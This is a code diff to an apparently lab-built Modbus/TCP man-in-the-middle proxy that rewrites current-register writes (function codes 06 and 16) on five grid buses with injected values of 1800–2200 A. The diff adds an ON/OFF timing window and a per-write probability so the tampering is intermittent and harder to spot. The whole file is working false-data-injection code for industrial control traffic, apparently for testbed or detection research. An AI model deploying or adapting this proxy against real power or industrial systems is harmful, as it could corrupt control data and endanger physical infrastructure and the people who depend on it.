@@ -23,6 +23,11 @@ I_SCALE = 29
 NUM_BUS = 5
 I_INJECT_MIN_A = 1800.0
 I_INJECT_MAX_A = 2200.0
+# Mekanisme realistis: manipulasi hanya aktif pada jendela waktu tertentu,
+# lalu masih disaring probabilitas per-write.
+ATTACK_ON_SECONDS = 8.0
+ATTACK_OFF_SECONDS = 12.0
+MODIFY_PROBABILITY = 0.55
 RUN_ID_FILE = "/tmp/mitm_run_id"
 
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
@@ -30,40 +35,31 @@ MITM_LOG_DIR = os.path.join(BASE_DIR, "logs", "mitm")
 TRACE_CSV = os.path.join(MITM_LOG_DIR, "trace.csv")
 
 sys.path.append(BASE_DIR)
-from logger.mitm_trace_logger import ensure_trace_csv, append_trace_row, now_ts, get_run_id  # noqa: E402
+from logger.mitm_trace_logger import write_mitm_proxy_snapshot  # noqa: E402
 
 # Kunci RNG: beberapa koneksi TCP paralel tidak merusak state random global.
 _rng_lock = threading.Lock()
-_trace_lock = threading.Lock()
-_trace_iter = 0
 _v_cache_by_bus = {}
 
 
-def _next_trace_iter() -> int:
-    global _trace_iter
-    with _trace_lock:
-        _trace_iter += 1
-        return _trace_iter
+def _should_modify_now() -> bool:
+    """
+    Kombinasi interval waktu + probabilitas:
+    - Hanya aktif saat window ON dalam siklus ON/OFF.
+    - Saat ON, tiap write dimodifikasi dengan peluang MODIFY_PROBABILITY.
+    """
+    cycle = ATTACK_ON_SECONDS + ATTACK_OFF_SECONDS
+    if cycle <= 0:
+        return False
+    phase = time.monotonic() % cycle
+    if phase >= ATTACK_ON_SECONDS:
+        return False
+    with _rng_lock:
+        return random.random() < MODIFY_PROBABILITY
 
 
 def _log_mitm_proxy_i(bus: int, i_orig: float, i_new: float, v_before: Optional[float], v_after: Optional[float]):
-    iter_idx = _next_trace_iter()
-    append_trace_row(
-        TRACE_CSV,
-        [
-            now_ts(),
-            iter_idx,
-            get_run_id(),
-            bus,
-            "" if v_before is None else f"{v_before:.6f}",
-            "" if v_after is None else f"{v_after:.6f}",
-            f"{i_orig:.6f}",
-            f"{i_new:.6f}",
-            "",
-            "",
-            "",
-        ],
-    )
+    write_mitm_proxy_snapshot(bus, v_before, v_after, i_orig, i_new)
 
 
 def _pop_modbus_tcp_frame(buf: bytearray) -> Optional[bytes]:
@@ -110,16 +106,20 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
         if I_BASE_ADDR <= addr < I_BASE_ADDR + NUM_BUS:
             old_val = (pdu[3] << 8) | pdu[4]
             i_orig = old_val / I_SCALE
-            new_val = _fake_i_register_value()
-            pdu[3] = (new_val >> 8) & 0xFF
-            pdu[4] = new_val & 0xFF
             bus = addr - I_BASE_ADDR + 1
             v_before = _v_cache_by_bus.get(bus)
-            _log_mitm_proxy_i(bus, i_orig, new_val / I_SCALE, v_before, v_before)
-            print(
-                f"[modbus-proxy] FC06 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {new_val / I_SCALE:.3f}A",
-                flush=True,
-            )
+            if _should_modify_now():
+                new_val = _fake_i_register_value()
+                pdu[3] = (new_val >> 8) & 0xFF
+                pdu[4] = new_val & 0xFF
+                i_after = new_val / I_SCALE
+                print(
+                    f"[modbus-proxy] FC06 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {i_after:.3f}A",
+                    flush=True,
+                )
+            else:
+                i_after = i_orig
+            _log_mitm_proxy_i(bus, i_orig, i_after, v_before, v_before)
     elif fc == 0x10 and len(pdu) >= 6:
         start = (pdu[1] << 8) | pdu[2]
         count = (pdu[3] << 8) | pdu[4]
@@ -135,16 +135,20 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
                 lo = 6 + 2 * i
                 old_val = (pdu[lo] << 8) | pdu[lo + 1]
                 i_orig = old_val / I_SCALE
-                new_val = _fake_i_register_value()
-                pdu[lo] = (new_val >> 8) & 0xFF
-                pdu[lo + 1] = new_val & 0xFF
                 bus = addr - I_BASE_ADDR + 1
                 v_before = _v_cache_by_bus.get(bus)
-                _log_mitm_proxy_i(bus, i_orig, new_val / I_SCALE, v_before, v_before)
-                print(
-                    f"[modbus-proxy] FC16 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {new_val / I_SCALE:.3f}A",
-                    flush=True,
-                )
+                if _should_modify_now():
+                    new_val = _fake_i_register_value()
+                    pdu[lo] = (new_val >> 8) & 0xFF
+                    pdu[lo + 1] = new_val & 0xFF
+                    i_after = new_val / I_SCALE
+                    print(
+                        f"[modbus-proxy] FC16 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {i_after:.3f}A",
+                        flush=True,
+                    )
+                else:
+                    i_after = i_orig
+                _log_mitm_proxy_i(bus, i_orig, i_after, v_before, v_before)
 
     new_len = 1 + len(pdu)
     mbap = frame[:4] + new_len.to_bytes(2, "big") + bytes([unit])
@@ -200,7 +204,6 @@ def _mitm_client_handler(client: socket.socket, _addr):
 
 
 def main():
-    ensure_trace_csv(TRACE_CSV)
     random.seed(MITM_FIXED_SEED)
     ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -208,7 +211,8 @@ def main():
     ls.listen(32)
     print(
         f"[modbus-proxy] listen 0.0.0.0:{MITM_PROXY_PORT} -> {GATEWAY_IP}:{MODBUS_PORT} "
-        f"I regs {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1} fixed_seed={MITM_FIXED_SEED}",
+        f"I regs {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1} fixed_seed={MITM_FIXED_SEED} "
+        f"on={ATTACK_ON_SECONDS}s off={ATTACK_OFF_SECONDS}s p={MODIFY_PROBABILITY}",
         flush=True,
     )
     while True:
